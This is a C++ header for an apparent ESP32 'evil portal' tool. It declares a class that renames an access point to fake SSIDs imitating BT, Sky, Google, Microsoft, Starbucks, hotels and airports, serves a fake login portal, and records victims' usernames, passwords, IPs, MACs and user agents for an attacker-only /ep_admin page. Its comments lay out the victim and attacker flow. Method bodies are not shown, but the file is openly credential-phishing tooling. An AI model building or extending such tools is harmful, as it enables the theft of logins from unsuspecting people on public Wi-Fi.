#pragma once
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "evil_portal_templates.h"
#include "cyber_storage.h"

static const char* EP_AP_NAMES[] = {
  "Free WiFi",
  "BT-Hub-XXXX",
  "SKY12345",
  "Google_Guest",
  "Microsoft_Guest",
  "Starbucks WiFi",
  "Hotel_Guest_WiFi",
  "Airport_Free_WiFi",
};

#define MAX_EP_CREDS 20

struct EPCred {
  String user, pass, ip, mac, useragent, hostname;
  uint32_t ts;
};

struct EPConn {
  String ip, mac, useragent;
  uint32_t ts;
};

// EvilPortal no longer has its own WebServer.
// It borrows the main WebUI WebServer (passed in via begin()) so both
// the portal AND the dashboard run on the same port 80, same AP.
//
// Victim  → 192.168.4.1/          → login portal
// Attacker → 192.168.4.1/         → same portal (connect & check /ep_admin)
//            192.168.4.1/ep_admin  → admin view with all captures
// All dashboard API routes (/cmd, /state, etc.) still work normally.
//
// The AP just gets renamed to the fake SSID. Dashboard stays online.

class EvilPortal {
public:
  // Pass a pointer to the main WebServer so portal can register routes on it
  bool   begin(int templateId, WebServer* mainServer);
  void   handle();    // call from loop() — processes DNS only
  void   stop();

  bool   isRunning()       { return _running; }
  int    getCredCount()    { return _credCount; }
  EPCred getCred(int i)    { return (i>=0&&i<_credCount)?_creds[i]:EPCred{}; }
  void   clearCreds()      { _credCount=0; _connCount=0; }
  int    getConnCount()    { return _connCount; }
  EPConn getConn(int i)    { return (i>=0&&i<_connCount)?_conns[i]:EPConn{}; }

private:
  WebServer*  _srv       = nullptr;  // borrowed pointer to main WebUI server
  DNSServer   _dns;
  bool        _running   = false;
  int         _tplId     = 0;
  String      _currentSSID = "";

  static const int MAX_EP_CONNS = 20;
  EPCred  _creds[MAX_EP_CREDS];
  int     _credCount = 0;
  EPConn  _conns[MAX_EP_CONNS];
  int     _connCount = 0;

  String _getMacForIP(const String& ip);
  void   _logVisit();
  void   _handlePortalRoot();
  void   _handlePortalLogin();
  void   _handlePortalSuccess();
  void   _handlePortalAdmin();
  void   _handleCaptiveRedirect();
};
